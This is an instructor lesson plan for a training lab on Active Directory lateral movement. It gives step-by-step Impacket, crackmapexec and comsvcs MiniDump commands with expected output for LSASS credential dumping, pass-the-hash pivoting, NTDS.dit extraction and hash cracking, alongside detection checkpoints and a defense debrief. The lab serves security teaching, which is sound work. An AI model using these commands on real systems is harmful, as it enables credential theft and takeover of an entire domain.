# Lesson Plan -- SCEN-003: APT Lateral Movement

## Course Information

- **Scenario ID**: SCEN-003
- **Duration**: 4 hours (240 minutes)
- **Difficulty**: Advanced
- **Class Size**: Up to 20 students (solo)
- **Prerequisites**:
  - Active Directory fundamentals (domains, OUs, groups, GPO)
  - Windows authentication mechanisms (NTLM, Kerberos)
  - Credential dumping concepts (LSASS, SAM, NTDS.dit)
  - Prior completion of SCEN-002 (Kerberoasting) recommended
- **Tools**: Impacket suite, crackmapexec, pypykatz, evil-winrm, hashcat
- **ATT&CK Techniques**: T1059.001, T1003.001, T1003.003, T1558.003, T1021.002, T1574.001

## Learning Objectives

By the end of this lab, students will be able to:

1. Establish remote access to a Windows workstation using domain credentials and Impacket tools (T1021.002)
2. Dump LSASS process memory to extract cached NTLM hashes and WDigest cleartext credentials (T1003.001)
3. Enumerate credential material to identify lateral movement opportunities across an AD environment
4. Execute pass-the-hash and credential-based lateral movement to pivot between workstations (T1021.002)
5. Escalate from workstation admin to domain controller compromise using a discovered credential chain
6. Extract NTDS.dit to dump all domain password hashes (T1003.003)
7. Map each attack phase to the corresponding MITRE ATT&CK technique ID
8. Identify detection opportunities at each phase of the lateral movement kill chain

## Pre-Class Preparation

### Instructor Setup (30 minutes before class)

1. Deploy scenario from portal dashboard: Admin > Lab Slots > Deploy > `apt_lateral_movement`
2. Verify all 4 VMs are running: `kali-attacker`, `dc01`, `ws01`, `ws02`
3. Confirm domain services are operational:
   ```bash
   crackmapexec smb <blue_prefix>.20 -u jsmith -p 'Password123' -d lab.local
   ```
   Expected: `[+]` authentication success
4. Verify WDigest is enabled on ws01:
   ```powershell
   reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
   ```
   Expected: `UseLogonCredential REG_DWORD 0x1`
5. Confirm agarcia credentials are cached on ws01 by logging in as agarcia once, then logging out. This seeds the LSASS cache.
6. Distribute student access sheets (jsmith credentials and kali-attacker IP only)
7. Pre-stage the portal hint system with the graduated hints listed below

### Student Prerequisites

- Familiarity with Linux CLI and SSH
- Understanding of SMB protocol and Windows admin shares (C$, ADMIN$)
- Ability to read Impacket tool output
- Conceptual understanding of NTLM hashes (no need to know hash internals)

---

## Lesson Flow

### Phase 0: Mission Briefing (15 minutes)

**Instructor presents** (see SLIDES_CONTENT.md, Slides 1-6):

- Scenario context: "You are a penetration tester simulating an APT intrusion. A phishing campaign against the target organization -- a mid-size enterprise running Active Directory -- yielded valid credentials for one domain user: jsmith. Your mission is to move laterally through the domain and compromise the domain controller."
- Windows authentication overview: NTLM vs Kerberos, how LSASS stores credentials, what WDigest is and why it matters
- The lateral movement kill chain: foothold, credential dumping, pivot, escalate, domain compromise
- ATT&CK techniques they will encounter (show the matrix, do not reveal which ones map to which phase)
- Rules of engagement: stay within the lab network, document every step, map techniques to ATT&CK

**Discussion questions**:

1. "Why does an attacker who compromises a single workstation often end up owning the entire domain?"
   - Expected: Credential reuse, cached credentials, admin accounts used across tiers, flat network architecture
2. "What is the difference between NTLM and Kerberos authentication? Why does it matter for lateral movement?"
   - Expected: NTLM uses hash challenge-response (enables pass-the-hash), Kerberos uses tickets (enables pass-the-ticket, Kerberoasting)
3. "If you were a defender, where would you put your detection sensors to catch lateral movement?"
   - Expected: Domain controller event logs, network traffic analysis (SMB, WinRM), endpoint detection (LSASS access monitoring)

**Distribute**: Quick Reference card (QUICK_REFERENCE.md) and Incident Report Template (INCIDENT_REPORT_TEMPLATE.md)

---

### Phase 1: Initial Foothold (40 minutes)

**ATT&CK Technique**: T1021.002 -- Remote Services: SMB/Windows Admin Shares
**ATT&CK Technique**: T1059.001 -- Command and Scripting Interpreter: PowerShell

**What the adversary did**: Used phishing-obtained credentials to authenticate to a workstation via SMB admin shares, then ran enumeration commands to map the domain.

**Why it worked**: jsmith had local administrator rights on ws01. Admin shares (C$, ADMIN$) were accessible. PowerShell execution policy was unrestricted.

**Student task**:
1. From `kali-attacker`, establish a remote shell on ws01 using jsmith credentials
2. Perform situational awareness: enumerate domain users, groups, shares, local admins
3. Identify the Domain Admins group members
4. Document the network layout and identify other machines in the domain

**Instructor walkthrough** (reveal progressively if students are stuck):

```bash
# Step 1: Establish access to ws01
impacket-psexec lab.local/jsmith:'Password123'@<ws01_ip>

# Alternative: WinRM
evil-winrm -i <ws01_ip> -u jsmith -p 'Password123'

# Alternative: SMB exec
impacket-smbexec lab.local/jsmith:'Password123'@<ws01_ip>
```

```cmd
# Step 2: Situational awareness (from ws01 shell)
whoami /all
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
ipconfig /all
net share
net view /domain
nltest /dclist:lab.local
```

**Detection checkpoint**:
- "What would a defender see on ws01 at this point?"
- Expected: Windows Security Event ID 4624 (Type 3 -- network logon) for jsmith, Event ID 4672 (special privileges assigned to logon) because jsmith is local admin, potential Event ID 4688 (process creation) for cmd.exe/powershell.exe spawned by PsExec service
- On dc01: Event ID 4776 (credential validation) for jsmith, Event ID 4768/4769 (Kerberos TGT/TGS request)

**Key teaching point**: A single compromised credential with local admin rights gives the attacker a foothold equivalent to physical access to the machine. This is why the principle of least privilege matters -- jsmith should not be a local admin on any workstation unless there is a documented business need.

**Graduated hints**:
- Hint 1: "Try using Impacket tools to connect to ws01. Which Impacket tool gives you a shell over SMB?"
- Hint 2: "Run `impacket-psexec` with the format: `domain/user:password@target_ip`. The domain is lab.local."
- Hint 3: "Full command: `impacket-psexec lab.local/jsmith:'Password123'@<ws01_ip>`. Once connected, run `whoami /all` and `net group 'Domain Admins' /domain`."

---

### Phase 2: Credential Dumping (50 minutes)

**ATT&CK Technique**: T1003.001 -- OS Credential Dumping: LSASS Memory

**What the adversary did**: Dumped the LSASS process memory on the compromised workstation to extract cached credentials. Because WDigest was enabled, cleartext passwords were stored in memory alongside NTLM hashes.

**Why it worked**: WDigest authentication provider was enabled via registry (`UseLogonCredential=1`), which causes Windows to store cleartext credentials in LSASS. The attacker had local admin rights, which is sufficient to read LSASS memory. No credential guard was configured.

**Student task**:
1. Dump credentials from ws01 using secretsdump, crackmapexec --lsa, or pypykatz
2. Identify all cached credentials (expect: jsmith, svc_sql, agarcia)
3. Determine which dumped credentials might provide access to other systems
4. Test each credential against ws02 and dc01 using crackmapexec

**Instructor walkthrough**:

```bash
# Method 1: Remote secretsdump (preferred -- runs from Kali, no AV risk)
impacket-secretsdump lab.local/jsmith:'Password123'@<ws01_ip>

# Method 2: CrackMapExec LSA dump
crackmapexec smb <ws01_ip> -u jsmith -p 'Password123' -d lab.local --lsa

# Method 3: Manual LSASS dump + pypykatz
# From evil-winrm session on ws01:
# Upload procdump or use comsvcs.dll MiniDump
# rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
# Download lsass.dmp to Kali
# pypykatz lsa minidump lsass.dmp
```

Expected output (credential dump):
```
[*] Dumping cached domain logon information
LAB.LOCAL/jsmith:Password123       (WDigest cleartext)
LAB.LOCAL/svc_sql:Summer2024!      (WDigest cleartext -- cached service account)
LAB.LOCAL/agarcia:Welcome2024!     (WDigest cleartext -- cached admin logon)
```

```bash
# Test credentials against other hosts
crackmapexec smb <ws02_ip> -u agarcia -p 'Welcome2024!' -d lab.local
# Expected: [+] lab.local\agarcia:Welcome2024! (Pwn3d!)

crackmapexec smb <dc01_ip> -u agarcia -p 'Welcome2024!' -d lab.local
# Expected: [+] lab.local\agarcia:Welcome2024! (Pwn3d!)

crackmapexec smb <ws02_ip> -u svc_sql -p 'Summer2024!' -d lab.local
# Expected: [+] auth success but NOT admin (no Pwn3d!)
```

**Detection checkpoint**:
- "What would a defender see during LSASS credential dumping?"
- Expected: Sysmon Event ID 10 (process access to lsass.exe) with GrantedAccess 0x1010 or 0x1FFFFF, Windows Security Event ID 4656 (handle requested to lsass.exe), potential antivirus alert for secretsdump/mimikatz behavior
- Network detection: SMB traffic with large data transfers from ws01 (LSASS dump being exfiltrated if done manually)
- "Why did we find agarcia's credentials cached on ws01?"
- Expected: An administrator (agarcia) previously logged into ws01 -- possibly for troubleshooting or software installation. Their credentials remained cached in LSASS memory. This is the core argument for tiered administration.

**Key teaching point**: Every time an administrator logs into a workstation, their credentials are cached in LSASS. An attacker who compromises that workstation inherits access to every system those cached credentials can reach. This is why the tiered administration model separates workstation admins, server admins, and domain admins -- a domain admin should never log into a workstation.

**Graduated hints**:
- Hint 1: "You need to extract credentials from ws01's memory. Look at Impacket tools -- one of them is designed specifically for credential dumping."
- Hint 2: "Run `impacket-secretsdump` against ws01 using jsmith's credentials. WDigest is enabled, so look for cleartext passwords in the output."
- Hint 3: "Command: `impacket-secretsdump lab.local/jsmith:'Password123'@<ws01_ip>`. In the output, look for WDigest entries -- you should find credentials for at least two other accounts. Test each one against ws02 with crackmapexec."

---

### Phase 3: Lateral Movement (45 minutes)

**ATT&CK Technique**: T1021.002 -- Remote Services: SMB/Windows Admin Shares

**What the adversary did**: Used dumped credentials (agarcia) to authenticate to a second workstation (ws02) via SMB. The agarcia account had local admin rights on ws02, allowing full system access.

**Why it worked**: agarcia was an IT admin with local admin rights across multiple machines. The organization had no network segmentation between workstations, no MFA on admin protocols, and no PAM solution controlling admin access.

**Student task**:
1. Use agarcia credentials to establish a shell on ws02
2. Dump credentials from ws02 to confirm agarcia's privilege level
3. Verify that agarcia has admin access to dc01
4. Document the credential chain so far: jsmith -> agarcia -> ???

**Instructor walkthrough**:

```bash
# Access ws02 with agarcia creds
impacket-psexec lab.local/agarcia:'Welcome2024!'@<ws02_ip>

# Alternatively, pass-the-hash if you only have the NTLM hash:
impacket-psexec -hashes :<agarcia_ntlm_hash> lab.local/agarcia@<ws02_ip>

# Situational awareness on ws02
whoami /all
net localgroup administrators
net group "Domain Admins" /domain
```

```bash
# Dump ws02 credentials
impacket-secretsdump lab.local/agarcia:'Welcome2024!'@<ws02_ip>

# Verify access to DC
crackmapexec smb <dc01_ip> -u agarcia -p 'Welcome2024!' -d lab.local
# Expected: (Pwn3d!) -- agarcia is local admin on dc01
```

**Detection checkpoint**:
- "What changed on the network when you pivoted to ws02?"
- Expected: New Event ID 4624 (Type 3) on ws02 from the Kali attacker IP for agarcia. Event ID 7045 (service installed) if PsExec was used. On dc01, Event ID 4776 (credential validation) for agarcia authenticating to ws02.
- "How would you distinguish legitimate admin access from attacker lateral movement?"
- Expected: Unusual source IP (Kali, not agarcia's normal workstation), unusual time of day, rapid sequential logons across multiple machines, PsExec service creation events

**Key teaching point**: Lateral movement follows the credential chain. The attacker does not "hack" ws02 -- they authenticate to it using valid credentials stolen from ws01. From the defender's perspective, this looks like a legitimate admin logon unless they correlate the source IP, timing, and sequence of logons across hosts.

**Graduated hints**:
- Hint 1: "You found credentials in Phase 2. Try using them to connect to ws02 the same way you connected to ws01."
- Hint 2: "The agarcia account has admin rights on ws02. Use impacket-psexec with agarcia's credentials against ws02's IP."
- Hint 3: "Command: `impacket-psexec lab.local/agarcia:'Welcome2024!'@<ws02_ip>`. Once connected, run `net localgroup administrators` to see agarcia's privilege level. Then test access to dc01 with crackmapexec."

---

### Phase 4: Domain Compromise (40 minutes)

**ATT&CK Technique**: T1003.003 -- OS Credential Dumping: NTDS
**ATT&CK Technique**: T1021.002 -- Remote Services: SMB/Windows Admin Shares

**What the adversary did**: Used the escalated credentials (agarcia, who has local admin on dc01) to access the domain controller and extract the NTDS.dit database, which contains all domain user password hashes.

**Why it worked**: agarcia's IT admin account was granted local admin on the domain controller -- a common but catastrophic misconfiguration. There was no privileged access management (PAM) solution, no just-in-time (JIT) access controls, and no separation between workstation admin and DC admin roles.

**Student task**:
1. Authenticate to dc01 using agarcia credentials
2. Verify domain admin-equivalent access
3. Extract NTDS.dit using secretsdump with the `-just-dc` flag
4. Identify the krbtgt hash (explain its significance for Golden Ticket attacks)
5. Identify the domain Administrator hash

**Instructor walkthrough**:

```bash
# Access dc01
impacket-psexec lab.local/agarcia:'Welcome2024!'@<dc01_ip>

# Verify access level
whoami /all
net group "Domain Admins" /domain
```

```bash
# NTDS.dit extraction (the crown jewels)
impacket-secretsdump lab.local/agarcia:'Welcome2024!'@<dc01_ip> -just-dc

# Expected output includes:
# Administrator:500:<lm_hash>:<ntlm_hash>:::
# krbtgt:502:<lm_hash>:<ntlm_hash>:::
# jsmith:1103:<lm_hash>:<ntlm_hash>:::
# agarcia:1104:<lm_hash>:<ntlm_hash>:::
# svc_sql:1105:<lm_hash>:<ntlm_hash>:::
```

```bash
# Optional: Crack hashes with hashcat
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Detection checkpoint**:
- "What happens on the DC when NTDS.dit is extracted?"
- Expected: Event ID 4624 (Type 3) for agarcia on dc01 from an unexpected IP, Event ID 4672 (special privileges -- admin logon), ESENT/NTDS events related to VSS shadow copy creation (secretsdump uses volume shadow copy to read NTDS.dit), Event ID 8222 (shadow copy created), large data transfer over SMB from dc01
- "Why is the krbtgt hash the most dangerous thing in that dump?"
- Expected: The krbtgt hash can be used to forge Golden Tickets -- Kerberos TGTs that grant any access for any user for any duration. A Golden Ticket attack persists even after the initial compromise is remediated unless krbtgt is reset twice.

**Key teaching point**: NTDS.dit extraction is game over for the domain. Every user's password hash, every computer account, every service account -- all compromised. The only recovery is to reset every password in the domain, reset krbtgt twice (with a 12+ hour gap between resets), and rebuild trust relationships. This is why domain controller access must be treated as the most sensitive privilege in the enterprise.

**Graduated hints**:
- Hint 1: "You've confirmed agarcia has admin rights on dc01. Connect to dc01 the same way you connected to ws02."
- Hint 2: "Use secretsdump against dc01 with the `-just-dc` flag to extract the NTDS.dit database. This dumps all domain password hashes."
- Hint 3: "Command: `impacket-secretsdump lab.local/agarcia:'Welcome2024!'@<dc01_ip> -just-dc`. In the output, look for the Administrator and krbtgt hashes -- these represent complete domain compromise."

---

### Phase 5: Debrief and Defense Discussion (30 minutes)

**Instructor leads** (see SLIDES_CONTENT.md, Slides 17-22):

#### Attack Chain Reconstruction (10 minutes)
Walk through the full credential chain on the whiteboard:

```
jsmith (phishing)
  -> ws01 (local admin, T1021.002)
    -> LSASS dump (WDigest, T1003.001)
      -> agarcia credentials discovered
        -> ws02 (local admin, T1021.002)
          -> dc01 (local admin, T1021.002)
            -> NTDS.dit (T1003.003)
              -> ALL domain hashes compromised
```

Ask students: "At which point could a defender have stopped this chain?" Walk through each link and discuss what control would have broken it.

#### Defense-in-Depth Discussion (10 minutes)

| Defense | What It Breaks | Implementation |
|---|---|---|
| Least privilege (remove jsmith local admin) | Phase 1 -- no admin access to dump LSASS | Group Policy, LAPS |
| Disable WDigest | Phase 2 -- no cleartext creds in LSASS | Registry: `UseLogonCredential=0` |
| Credential Guard | Phase 2 -- LSASS runs in isolated container | Windows 10/11 Enterprise, hardware-backed |
| Tiered administration | Phase 3 -- agarcia workstation creds cannot reach DC | Separate admin accounts per tier |
| Protected Users group | Phase 2/3 -- prevents NTLM auth, no credential caching | AD group membership |
| PAW (Privileged Access Workstation) | Phase 4 -- DC admin only from hardened PAW | Dedicated admin workstations |
| LAPS | Phase 1 -- unique local admin password per machine | Microsoft LAPS/Windows LAPS |
| Network segmentation | Phase 3 -- workstations cannot reach DC directly | Firewall rules, VLANs |
| MFA on admin protocols | Phase 1-4 -- stolen password alone is insufficient | Smart cards, FIDO2, Windows Hello |

#### Real-World Context (10 minutes)

- **APT29 (Cozy Bear)**: SolarWinds supply chain compromise (2020) used exactly this kill chain -- initial access via trojanized update, credential dumping, lateral movement through AD, Golden Ticket persistence
- **APT28 (Fancy Bear)**: DNC compromise (2016) followed the same pattern -- phishing foothold, credential harvesting, lateral movement to mail servers
- **Ransomware operators**: Conti, LockBit, BlackCat all follow foothold -> dump -> pivot -> DC -> deploy ransomware domain-wide
- "Every major AD compromise in the last decade has used some variant of the chain you just executed."

**Discussion questions for debrief**:
1. "Which single defense would have had the largest impact on breaking this attack chain?"
   - Expected: Tiered administration -- prevents credential exposure across tiers
2. "Why do organizations struggle to implement tiered administration?"
   - Expected: Convenience, cost, resistance from IT staff, legacy applications requiring cross-tier access
3. "If you were writing a detection rule, which Event ID correlation would catch this earliest?"
   - Expected: Event ID 4624 Type 3 from an unexpected source IP, correlated with 4672 (admin logon), especially when the same credential appears on multiple hosts in rapid succession

---

### Buffer Time (20 minutes)

Reserve 20 minutes distributed across phases for:
- Students who need extra time on credential dumping (most common sticking point)
- Technical issues (VM reset, credential cache not populated)
- Extended discussion if students have strong questions

---

## Time Budget Summary

| Phase | Duration | Cumulative |
|---|---|---|
| Phase 0: Mission Briefing | 15 min | 0:15 |
| Phase 1: Initial Foothold | 40 min | 0:55 |
| Phase 2: Credential Dumping | 50 min | 1:45 |
| Phase 3: Lateral Movement | 45 min | 2:30 |
| Phase 4: Domain Compromise | 40 min | 3:10 |
| Phase 5: Debrief and Defense | 30 min | 3:40 |
| Buffer | 20 min | 4:00 |
| **Total** | **240 min** | **4:00** |

---

## Assessment Rubric

| Criterion | Points | How to Verify |
|---|---|---|
| Established shell on ws01 using jsmith credentials | 10 | Screenshot of `whoami /all` output showing `lab\jsmith` on ws01 |
| Performed domain enumeration (users, groups, shares) | 10 | Incident report documents Domain Admins group members and network shares |
| Successfully dumped LSASS credentials from ws01 | 15 | Screenshot showing secretsdump/crackmapexec output with cached credentials |
| Identified agarcia as the pivot account | 10 | Incident report documents credential testing methodology and results |
| Established shell on ws02 via lateral movement | 15 | Screenshot of `whoami /all` showing `lab\agarcia` on ws02 |
| Verified agarcia admin access to dc01 | 5 | CrackMapExec output showing `(Pwn3d!)` against dc01 |
| Compromised dc01 (shell or secretsdump) | 15 | Screenshot of shell on dc01 or secretsdump output from dc01 |
| Extracted NTDS.dit hashes (Bonus) | 10 | Secretsdump output with `-just-dc` showing Administrator and krbtgt hashes |
| Correct ATT&CK mapping for each phase | 5 | Incident report technique table matches: T1021.002, T1003.001, T1003.003 |
| Completed incident report with timeline | 5 | Incident report template filled with timestamps, credential chain, and recommendations |
| **Total** | **100** | |

**Grading scale**: 90-100 Excellent, 75-89 Proficient, 60-74 Developing, <60 Needs Remediation

---

## Contingency Plans

### If students finish early
- Attempt DLL Search Order Hijacking on ws02 (T1574.001 -- unquoted service path vulnerability V005)
- Kerberoast the svc_sql service account from the dumped credentials (T1558.003)
- Write YARA rules or Sigma rules to detect the techniques they used
- Attempt the same attack chain using only pass-the-hash (no cleartext passwords)

### If students are stuck on credential dumping
- Verify WDigest is enabled: have students check the registry key remotely
- Suggest trying crackmapexec `--lsa` instead of secretsdump if one tool fails
- Confirm jsmith has local admin: `crackmapexec smb <ws01_ip> -u jsmith -p 'Password123' -d lab.local` should show `(Pwn3d!)`
- If all credential dumping fails: provide the agarcia credentials directly and note in assessment

### If students are stuck on lateral movement
- Confirm target firewall allows SMB (445): `nmap -p 445 <ws02_ip>`
- Verify credential works: `crackmapexec smb <ws02_ip> -u agarcia -p 'Welcome2024!' -d lab.local`
- Suggest trying different Impacket tools: psexec, smbexec, wmiexec, or evil-winrm

### If infrastructure fails
- Reset individual VM: Admin > Lab Slots > Select slot > Reset to Baseline
- If reset fails: Admin > Destroy > Redeploy (approximately 5 minutes)
- If agarcia credentials are not cached on ws01 after redeploy:
  1. Log into ws01 as agarcia via RDP or WinRM
  2. Run a few commands
  3. Log out
  4. Wait 30 seconds for LSASS to cache the credentials
- Fallback: Walk through the scenario as a live demonstration using the instructor console
